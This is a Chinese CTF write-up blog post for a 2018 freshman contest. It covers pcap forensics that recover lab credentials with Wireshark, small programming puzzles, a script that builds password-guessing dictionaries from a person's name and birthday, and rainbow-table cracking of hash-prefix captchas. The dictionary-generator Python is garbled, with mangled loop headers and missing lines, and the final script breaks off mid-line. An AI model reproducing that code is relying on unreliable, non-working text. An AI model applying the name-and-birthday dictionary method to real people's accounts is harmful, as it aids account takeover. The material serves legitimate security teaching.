        <content type="html"><![CDATA[<h1 id="Forensics"><a href="#Forensics" class="headerlink" title="Forensics"></a>Forensics</h1><h2 id="BabyForensics-200"><a href="#BabyForensics-200" class="headerlink" title="BabyForensics (200)"></a>BabyForensics (200)</h2><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">一名黑客渗透了一个网站，并且最后拿到了一份机密信息，我们抓到了黑客入侵过程的全部流量，正在进行取证工作 </span><br><span class="line"></span><br><span class="line"> 请问这个网站使用的 PHP 框架是什么？</span><br><span class="line">请问黑客最后拿到的机密文件中 MYSQL 服务器的用户名与密码是什么？</span><br><span class="line">请问黑客最后拿到的机密文件中 MYSQL 服务器的 IPV4 地址是什么？</span><br><span class="line">此题仅限大一学生，大二及以上学生不计分 </span><br><span class="line"></span><br><span class="line"> 注： flag 中的字母全部小写 </span><br><span class="line"></span><br><span class="line">flag 格式为 &quot;flag&#123; 框架名称_MYSQL 用户名_MYSQL 密码_MYSQL 的 IP 地址 &#125;&quot;</span><br><span class="line"></span><br><span class="line"> 流量包：https://**********/resource/BabyForensics.zip</span><br><span class="line">备用下载：http://**********/temp/BabyForensics.zip</span><br><span class="line">Update: 流量包已上传至群文件中</span><br></pre></td></tr></table></figure><p>压缩文件下载下来后解压出来是一个 pcap 文件，不知道怎么打开可以 Google 一下</p><p><img src="/2018/10/10/BlueWhale2018%E5%B9%B4%E7%BA%B3%E6%96%B0%E9%A2%98%E7%9B%AEWriteup/TIM%E6%88%AA%E5%9B%BE20180911104547.png"></p><p>找到 <a href="https://www.wireshark.org/">Wireshark</a> 下载安装，开始取证。pcap 文件是一个很大的数据包，里面包含了许多个小的数据包，数据包根据协议也有很多的种类</p><p><img src="/2018/10/10/BlueWhale2018%E5%B9%B4%E7%BA%B3%E6%96%B0%E9%A2%98%E7%9B%AEWriteup/TIM%E6%88%AA%E5%9B%BE20180911104914.png"></p><p>上图中的协议有 ARP、TCP 与 HTTP，此题只需关注 http 的数据包。使用显示过滤器过滤出 http 的数据包</p><p><img src="/2018/10/10/BlueWhale2018%E5%B9%B4%E7%BA%B3%E6%96%B0%E9%A2%98%E7%9B%AEWriteup/LUXR1U9KDHAFRB67XUIP.png"></p><p>上图中圈起来的就是“一对”数据包，上面的是请求包，下面的是响应包。每次浏览网页时，浏览器会向服务器发送一个请求，服务器收到请求后会返回一个响应。题目描述中讲到黑客最后获取了一份机密文件，所以这里进一步关注服务器的响应包，并且这个响应包应该是在最后。</p><p>从最后一个响应包，一个一个往前翻，在第 734581 个数据包中发现了一份配置文件，这里面有这道题的所有答案</p><p><img src="/2018/10/10/BlueWhale2018%E5%B9%B4%E7%BA%B3%E6%96%B0%E9%A2%98%E7%9B%AEWriteup/TIM%E6%88%AA%E5%9B%BE20180911105723.png"></p><p><img src="/2018/10/10/BlueWhale2018%E5%B9%B4%E7%BA%B3%E6%96%B0%E9%A2%98%E7%9B%AEWriteup/TIM%E6%88%AA%E5%9B%BE20180911105806.png"></p><ul><li>PHP 框架：douphp</li><li>MYSQL 地址：10.3.3.101</li><li>MYSQL 用户名：web</li><li>MYSQL 密码：e667jUPvJjXHvEUv</li></ul><blockquote><p>flag{douphp_web_e667jUPvJjXHvEUv_10.3.3.101}</p></blockquote><p>另外由于这三个题是相互关联的，所以黑客的 IP 地址为 192.168.94.59</p><h2 id="Mail1-500"><a href="#Mail1-500" class="headerlink" title="Mail1 (500)"></a>Mail1 (500)</h2><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">一名黑客渗透了一个网站，我们抓到了黑客入侵过程的全部流量，正在进行取证工作 </span><br><span class="line"></span><br><span class="line"> 请问黑客的 IP 地址是多少？</span><br><span class="line">请问该系统中所使用的交换机的型号是多少？</span><br><span class="line">已知网站中使用了某种简单的 Tomcat 容器自身的访问控制机制，请问该网站中 Tomcat 认证的用户名和密码是多少？</span><br><span class="line">注： flag 中的字母全部小写 </span><br><span class="line">flag 格式为 &quot;flag&#123;IP 地址_型号_用户名_密码 &#125;&quot;</span><br><span class="line"> 流量包：https://**********/resource/Mail1.zip</span><br><span class="line">Update: 流量包已上传至群文件中</span><br></pre></td></tr></table></figure><p>黑客的 IP 地址上一问已经出来了，接着寻找交换机的型号。一个包一个包的翻肯定是不现实的，最好的办法就是用关键字搜索 <br> 交换机的英文是 switch，在字节流中搜索一下就能找到</p><p><img src="/2018/10/10/BlueWhale2018%E5%B9%B4%E7%BA%B3%E6%96%B0%E9%A2%98%E7%9B%AEWriteup/TIM%E6%88%AA%E5%9B%BE20180911112450.png"></p><p>关于 Tomcat 容器自身的访问控制机制，题目中给了一个 <a href="https://blog.csdn.net/zzy7075/article/details/53639832"> 参考链接 </a>，<strong> 认真 </strong> 看完那篇文章，就能发现文章中介绍的那么多访问控制机制中，只有一个是经常在 web 表单认证中使用的</p><p><img src="/2018/10/10/BlueWhale2018%E5%B9%B4%E7%BA%B3%E6%96%B0%E9%A2%98%E7%9B%AEWriteup/TIM%E6%88%AA%E5%9B%BE20180911112741.png"></p><p><img src="/2018/10/10/BlueWhale2018%E5%B9%B4%E7%BA%B3%E6%96%B0%E9%A2%98%E7%9B%AEWriteup/3_CZVSIG0HQBL58XIHEO.png"></p><p>于是继续搜索关键词 j_username 与 j_password，也是一下就能找到</p><p><img src="/2018/10/10/BlueWhale2018%E5%B9%B4%E7%BA%B3%E6%96%B0%E9%A2%98%E7%9B%AEWriteup/TIM%E6%88%AA%E5%9B%BE20180911113108.png"></p><ul><li>黑客的 IP 地址：192.168.94.59</li><li>交换机的型号：s5120-28p-li</li><li>认证用户名：system</li><li>认证密码：manager</li></ul><blockquote><p>flag{192.168.94.59_s5120-28p-li_system_manager}</p></blockquote><h2 id="Mail2-500"><a href="#Mail2-500" class="headerlink" title="Mail2 (500)"></a>Mail2 (500)</h2><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">一名黑客渗透了一个网站，我们抓到了黑客入侵过程的全部流量，正在进行取证工作 </span><br><span class="line"></span><br><span class="line"> 请问管理员的邮箱是什么？</span><br><span class="line">请问黑客登录的邮箱中一共有几封邮件？</span><br><span class="line">请问黑客登录的邮箱中发送的最早的一封邮件的时间是多少？（转换成时间戳）</span><br><span class="line">Hint1: 这三道流量分析题目是相互关联的 </span><br><span class="line">Hint2: 在该流量包中有两个不同的人登录过邮箱，其中一个才是黑客，另一个不用管他</span><br><span class="line"></span><br><span class="line"> 注： flag 中的字母全部小写 </span><br><span class="line">flag 格式为 &quot;flag&#123; 管理员邮箱_邮件数量_时间戳 &#125;&quot;</span><br><span class="line"> 流量包：https://*********/resource/Mail2.zip</span><br><span class="line">Update: 流量包已上传至群文件中</span><br></pre></td></tr></table></figure><p>这个题就需要仔细分析整个流量包了，首先只需关注 http 的包，并且一直这三道题是相互关联的，那么在这个流量包中只需定位黑客 IP 地址的包即可，使用显示过滤器进行过滤，由此定位到黑客登录邮箱那附近的数据包，进行标记</p><p><img src="/2018/10/10/BlueWhale2018%E5%B9%B4%E7%BA%B3%E6%96%B0%E9%A2%98%E7%9B%AEWriteup/TIM%E6%88%AA%E5%9B%BE20180911113827.png"></p><p>一般在登录邮箱后进入的页面会显示邮箱中所有的邮件，所以在登录数据包的后面不远处肯定能找到邮箱中的全部邮件，追踪这个包的 Http 字节流，在登陆之后的几个包中就能找到请求邮件的包</p><p><img src="/2018/10/10/BlueWhale2018%E5%B9%B4%E7%BA%B3%E6%96%B0%E9%A2%98%E7%9B%AEWriteup/TIM%E6%88%AA%E5%9B%BE20180911114150.png"></p><p>在这个包后面的那个包中就是所有邮件的列表，将其字节流导出为 html 文件，之后在浏览器打开</p><p><img src="/2018/10/10/BlueWhale2018%E5%B9%B4%E7%BA%B3%E6%96%B0%E9%A2%98%E7%9B%AEWriteup/TIM%E6%88%AA%E5%9B%BE20180911114512.png"></p><p>所以最早的日期为<code>2018-08-08 14:36</code>，将其转换为时间戳为<code>1533710160</code>。另外寻找管理员的邮箱只需在字节流中查找关键字“admin@”即可，非常好找</p><p><img src="/2018/10/10/BlueWhale2018%E5%B9%B4%E7%BA%B3%E6%96%B0%E9%A2%98%E7%9B%AEWriteup/TIM%E6%88%AA%E5%9B%BE20180911114839.png"></p><ul><li>管理员邮箱：<a href="mailto:&#97;&#100;&#x6d;&#105;&#110;&#64;&#116;&#101;&#x73;&#116;&#x2e;&#x63;&#111;&#x6d;">&#97;&#100;&#x6d;&#105;&#110;&#64;&#116;&#101;&#x73;&#116;&#x2e;&#x63;&#111;&#x6d;</a></li><li>邮件数量：15</li><li>时间戳：1533710160</li></ul><blockquote><p>flag{admin@test.com_15_1533710160}</p></blockquote><h1 id="PPC"><a href="#PPC" class="headerlink" title="PPC"></a>PPC</h1><h2 id="查找素数 -150"><a href="# 查找素数 -150" class="headerlink" title="查找素数 (150)"></a>查找素数 (150)</h2><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">已知有一个等差数列，其首元素为 455，公差为 194, 要求找出在该数列中的第 149 个素数 </span><br><span class="line"></span><br><span class="line"> 此题仅限于大一学生，大二及以上学生该题不计分</span><br><span class="line"></span><br><span class="line">flag 格式为 flag&#123; 程序结果 &#125;</span><br></pre></td></tr></table></figure><p>在一个很大的等差数列中找素数，很简单，脚本如下</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">check</span>(<span class="params">n</span>):</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">2</span>, <span class="built_in">int</span>(n/<span class="number">2</span>+<span class="number">1</span>)):</span><br><span class="line">        <span class="keyword">if</span> n % i == <span class="number">0</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">sequence = <span class="number">455</span></span><br><span class="line">count = <span class="number">0</span></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    <span class="keyword">if</span> check(sequence):</span><br><span class="line">        count += <span class="number">1</span></span><br><span class="line">    <span class="keyword">if</span> count == <span class="number">149</span>:</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    sequence += <span class="number">194</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span> sequence</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>结果为 165161</p><blockquote><p>flag{165161}</p></blockquote><h2 id="下落的小球 -180"><a href="# 下落的小球 -180" class="headerlink" title="下落的小球 (180)"></a>下落的小球 (180)</h2><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">已知有一颗最大深度为 16 的完全二叉树，所有叶子结点深度相同。若在根节点处放一个小球，小球会沿着根节点结点开始下落。该完全二叉树内每个结点上都有一个开关，默认全部关闭，当小球下落后，每当有小球落到一个开关上时，开关的状态会改变。当小球到达一个结点时，如果该结点上的开关关闭，则往小球向左走，否则向右走，直到到达叶子结点为止。求第 12345 个小球落下后的叶子结点编号。</span><br><span class="line"></span><br><span class="line">flag 格式为 flag&#123; 结点编号 &#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>此题的意思是在一个深度为 16 的已经编号了序号的二叉树上，从根节点出下落一个小球，如果该节点为关则下一步小球向左走，否则向右走，默认全部为开，小球经过后开关取反。可以用列表构造一颗二叉树，里面包含了所有节点，之后模拟每一个小球的下落过程，直到第 12345 个小球为止。根据二叉树的性质，深度为 n 的二叉树最多有 2^n-1 个节点，所以列表大小行为 2^16-1。小球一开始从根节点（1 号节点）开始落下每次下落一层，如果往左下落，则下一个节点的编号为当前节点编号的 2 倍，往右落下则为往左落下的节点编号 +1。脚本如下</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">tree = [<span class="literal">False</span>] * (<span class="number">2</span> ** <span class="number">16</span> - <span class="number">1</span>)</span><br><span class="line"><span class="keyword">for</span> ball <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">12345</span> + <span class="number">1</span>):</span><br><span class="line">    node = <span class="number">1</span></span><br><span class="line">    <span class="keyword">for</span> layer <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="number">15</span>):</span><br><span class="line">        _node = node</span><br><span class="line">        node = node * <span class="number">2</span> + <span class="number">1</span> <span class="keyword">if</span> tree[node] <span class="keyword">else</span> node * <span class="number">2</span></span><br><span class="line">        tree[_node] = <span class="keyword">not</span> tree[_node]</span><br><span class="line">        <span class="keyword">if</span> ball == <span class="number">12345</span> <span class="keyword">and</span> layer == <span class="number">14</span>:</span><br><span class="line">            <span class="built_in">print</span> node</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>最后结果为 36358</p><blockquote><p>flag{36358}</p></blockquote><h2 id="密码生成 -200"><a href="# 密码生成 -200" class="headerlink" title="密码生成 (200)"></a>密码生成 (200)</h2><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">已知某人的姓名如生日，要求制作出一份字典，准确率越高越好 </span><br><span class="line"> 关于字典 </span><br><span class="line"></span><br><span class="line"> 测试时我们会准备一些不会超出题目范围的密码，其中包含了姓名与生日的信息 </span><br><span class="line"></span><br><span class="line"> 注意并不一定是全部信息，可能包含了部分信息，例如姓名为 zhang san，其生日是 1998 5 3，我们的测试密码为 zhang199853 或 zs980503</span><br><span class="line"></span><br><span class="line">我们将会测试我们准备的密码是否程序生成的字典之中，并且对程序生成密码的准确性与广泛性以及生成算法做一个估计与评价 </span><br><span class="line"></span><br><span class="line"> 语言限制为 C 或 C++，源代码中最好包含注释，注意变量、函数等命名规范 </span><br><span class="line"></span><br><span class="line"> 此题仅限于大一学生，大二及以上学生该题不计分 </span><br><span class="line"></span><br><span class="line"> 程序完成后请将源码打包发送至邮箱 ********@outlook.com，通过后我们会将 flag 发送给你 </span><br><span class="line"></span><br><span class="line"> 严禁抄袭 </span><br><span class="line"></span><br><span class="line"> 输入格式 </span><br><span class="line"> 一共包含两行 </span><br><span class="line"> 第一行为姓名的拼音，之间用空格分割 </span><br><span class="line">    可以保证全部为小写并且姓名长度小于等于 4 个字（如 &quot; 诸葛孔明 &quot; -&gt; &quot;zhu ge kong ming&quot; 或 &quot; 洁 &quot; -&gt; &quot;jie&quot; ）</span><br><span class="line"> 第二行为生日，之间用空格分割 </span><br><span class="line">    可以保证没有前导 0，并且生日是完全合理的（即不会出现 9999 9999 9999 这样的输入，但可能会出现 483 2 9 这类，483 年 2 月 9 日）</span><br><span class="line"> 如</span><br><span class="line">    zhang san</span><br><span class="line">    1998 5 3</span><br><span class="line">输出格式 </span><br><span class="line"> 要求输出到名为 &#x27;dic.txt&#x27; 的文件中，每行一个密码 </span><br><span class="line"> 如</span><br><span class="line">    zhang199853</span><br><span class="line">    zhang1998053</span><br><span class="line">    zhang19980503</span><br><span class="line">    Zhang199853</span><br><span class="line">    ....</span><br></pre></td></tr></table></figure><p>只需要尽可能多的考虑常见的姓名与生日的组合即可，先手动分析一下，以 <code> 张三 1998 5 27</code>为例：</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">zhang san</span><br><span class="line">1998 5 27</span><br></pre></td></tr></table></figure><ol><li>姓名与生日的组合方式只有两种<br> 姓名 + 生日<br> 生日 + 姓名</li><li>姓名的组合方式有全称和缩写两种<br> 其中姓名的每一个字都有可能为缩写，例如<br> zhangsan(没有缩写) -&gt; zhangs(“三”被缩写) -&gt; zsan(“张”被缩写) -&gt; zs(两个字都缩写)<br> 三个字和四个字的名字同理</li><li>姓名的大小写组合方式<br> 考虑每个姓名方式的大小写情况<br> Zhangsan ZHangsan …</li><li>姓氏单独出现<br> 也有可能只有姓氏出现，比如 zhang19980521</li><li>生日中年份的组合有两种<br> 如 1998 或 98</li><li>月与日的组合也各有两种<br> 分为有前导 0 和每有前导 0 两种<br> 如 521 或 0521(5 有前导 0)<br> 假如生日为 1 号，则 0501(都有前导 0) 或 051(5 有前导 0) 或 501(1 有前导 0) 或 51(都没有前导 0)</li></ol><p>可能的结果分析清楚后，一层一层的叠加处理即可，脚本如下</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Permutations</span>(<span class="title class_ inherited__">object</span>):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"><span class="meta">    @staticmethod</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">LetterCase</span>(<span class="params">strings</span>):</span><br><span class="line">        res = []</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span> &gt; j) &amp; <span class="number">1</span> <span class="keyword">else</span> s.upper()</span><br><span class="line">                j += <span class="number">1</span></span><br><span class="line">            res.append(word)</span><br><span class="line">        <span class="keyword">return</span> res</span><br><span class="line"></span><br><span class="line"><span class="meta">    @staticmethod</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">WordCombination</span>(<span class="params">word</span>):</span><br><span class="line">        res = []</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span> &gt; j) &amp; <span class="number">1</span> <span class="keyword">else</span> s</span><br><span class="line">                j += <span class="number">1</span></span><br><span class="line">            res.append(word)</span><br><span class="line">        <span class="keyword">return</span> res</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># Name</span></span><br><span class="line">name = raw_input().split(<span class="string">&#x27; &#x27;</span>)</span><br><span class="line">_name = <span class="built_in">list</span>()</span><br><span class="line">_name.append(name[<span class="number">0</span>])</span><br><span class="line">_name.append(<span class="string">&#x27;&#x27;</span>.join(name[<span class="number">1</span>:]))</span><br><span class="line">_name += Permutations.WordCombination(name)</span><br><span class="line">name = <span class="built_in">list</span>()</span><br><span class="line"><span class="keyword">for</span> n <span class="keyword">in</span> _name:</span><br><span class="line">    name += Permutations.LetterCase(n)</span><br><span class="line"></span><br><span class="line"><span class="comment"># Birthday</span></span><br><span class="line">birthday = raw_input().split(<span class="string">&#x27; &#x27;</span>)</span><br><span class="line">year = [birthday[<span class="number">0</span>], birthday[<span class="number">0</span>][-<span class="number">2</span>:]]</span><br><span class="line">month = [birthday[<span class="number">1</span>]]</span><br><span class="line"><span class="keyword">if</span> <span class="built_in">len</span>(birthday[<span class="number">1</span>]) </span><br></pre></td></tr></table></figure><h2 id="验证码破解 -350"><a href="# 验证码破解 -350" class="headerlink" title="验证码破解 (350)"></a>验证码破解 (350)</h2><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line">要求编程解决哈希验证码破解 </span><br><span class="line"> 关于哈希验证码 </span><br><span class="line"> 观察下面一行代码 </span><br><span class="line">    substr(md5(&#x27; 请在此输入验证码 &#x27;),0,6) === &#x27;dc55b0&#x27;</span><br><span class="line"> 该行代码输要求我们入一个字符串，使得该字符串进行 MD5 运算之后的 0 到 5 位等于 &#x27;dc55b0&#x27;</span><br><span class="line">该字符串称为哈希验证码 </span><br><span class="line"> 测试时我们会准备一些不同种类且范围小于等于 6 位的待破解的验证码，根据破解出验证码的速度与时间以及内存的使用量对程序做一个估计与评价 </span><br><span class="line"></span><br><span class="line"> 我们准备测试的哈希验证码种类包含: MD5、 SHA1 以及 SHA256</span><br><span class="line"></span><br><span class="line">提示：可以参考彩虹表以及鸽巢原理，从而大大加快验证码的破解速度 </span><br><span class="line"></span><br><span class="line"> 语言限制为 C 或 C++，源代码中最好包含注释，注意变量、函数等命名规范 </span><br><span class="line"></span><br><span class="line"> 程序完成后请将源码打包发送至邮箱 ********@outlook.com，通过后我们会将 flag 发送给你 </span><br><span class="line"></span><br><span class="line"> 此题推荐大二及以上学生，但如果大一学生完成此题则有加分奖励 </span><br><span class="line"></span><br><span class="line"> 哈希函数（MD5,SHA1,SHA256）运算部分的代码可以参考使用互联网上的例子，其余代码严禁抄袭 </span><br><span class="line"></span><br><span class="line"> 输入格式 </span><br><span class="line"> 一共三行 </span><br><span class="line"> 第一行为要破解的验证码种类，取值范围为 &quot;MD5&quot;、&quot;SHA1&quot; 或 &quot;SHA256&quot;，字母大写 </span><br><span class="line"> 第二行为要破解的验证码 </span><br><span class="line">    可以保证是可破解的并且长度不超过 6 位</span><br><span class="line"> 第三行为要破解的验证码范围，包括两个整形数字，之间用空格分隔 </span><br><span class="line">    可以保证范围合理，不超过 6 位并且不会超出哈希函数结果的范围（如不会出现 &quot;99 105&quot; 这种），并且范围和第二行的待破解验证码的长度相等</span><br><span class="line"> 如</span><br><span class="line">    MD5</span><br><span class="line">    dc55b0</span><br><span class="line">    0 5</span><br><span class="line">表示我们需要寻找一个字符串，使得该字符串经过 MD5 运算后的 0 到 5 位为 &quot;dc55b0&quot;</span><br><span class="line">输出格式 </span><br><span class="line"> 该验证码的破解结果 </span><br><span class="line"> 如</span><br><span class="line">    3f2d81a</span><br><span class="line">表示字符串 &quot;3f2d81a&quot; 经过 MD5 运算后的 0 到 5 位为 &quot;dc55b0&quot;</span><br><span class="line">更多例子 </span><br><span class="line"> 输入 </span><br><span class="line">    MD5</span><br><span class="line">    9d73</span><br><span class="line">    10 13</span><br><span class="line"> 表示我们需要寻找一个字符串，使得该字符串经过 MD5 运算后的 10 到 13 位为 &quot;9d73&quot;</span><br><span class="line">输出 </span><br><span class="line">    a05b9c</span><br><span class="line"> 表示字符串 &quot;a05b9c&quot; 经过 MD5 运算后的 10 到 13 位为 &quot;9d73&quot;</span><br><span class="line"></span><br><span class="line">输入 </span><br><span class="line">    SHA256</span><br><span class="line">    08a31f</span><br><span class="line">    1 6</span><br><span class="line"> 表示我们需要寻找一个字符串，使得该字符串经过 SHA256 运算后的 1 到 6 位为 &quot;08a31f&quot;</span><br><span class="line">输出 </span><br><span class="line">    c26bdc</span><br><span class="line"> 表示字符串 &quot;c26bdc&quot; 经过 SHA256 运算后的 1 到 6 位为 &quot;08a31f&quot;</span><br></pre></td></tr></table></figure><p>此类的哈希验证码在 CTF 竞赛中十分常见，需要碰撞一个最大长度为 6 的哈希，如果直接使用暴力破解的话效率十分低下，能多久跑出来就看命，但是如果使用彩虹表的话就完全不一样了。这里只以最长的 6 位验证码为例，6 位以下的更简单。</p><p>首先分析一下，长度为 6 的哈希值，其范围为从 000000~ffffff，也就是说一共有 16^6=16777216 种哈希值，这个数只到千万级别，不是很大。那么在理想情况（所有字符串产生的哈希值前六位均不同），我们只需要字符集 0~f 组成的 6 位 16777216 个不同的字符串，就一定可以得到所有的 6 位哈希值，但是现实中并没有这样的理想情况，这 16777216 个不同的字符串中有很大概率会有些字符串的哈希值前 6 位是相同的，为了降低这个概率，我们就需要更多的字符串。</p><p>如果我们同样使用 0~f 的字符集，组成 7 位字符串，就会产生 16^7=268435456 种不同的哈希，这个数是 6 位字符串的 16 倍，已经到了亿级别了，可以有非常大的概率保证覆盖了 000000~ffffff 所有的哈希可能值，但是 16^7 又有点太大了，其中有很多冗余数据我们在查验证码的时候用不到，所以需要对范围进行调整，从 0000000~3ffffff 将会用到 480M 的内存，从 0000000~4fffff 会用掉 700M 的内存，当然范围越大准确率也越高，但是占的内存也越多。</p><p>另外为了查询彩虹表方便，需要对彩虹表进行一定规律的排序，根据哈希值进行排序就能很快的移动文件指针找到对应行。<br>脚本如下(以 MD5 为例)</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">Generate</span>(<span class="params">ran1, ran2, filename</span>):</span><br><span class="line">    cache_dict = &#123;&#125;</span><br><span class="line">    length = ran2 - ran1</span><br><span class="line">    a = <span class="string">&#x27;%0&#x27;</span> + <span class="built_in">str</span>(length + <span class="number">1</span>) + <span class="string">&#x27;x&#x27;</span></span><br><span class="line">    b = <span class="string">&#x27;%0&#x27;</span> + <span 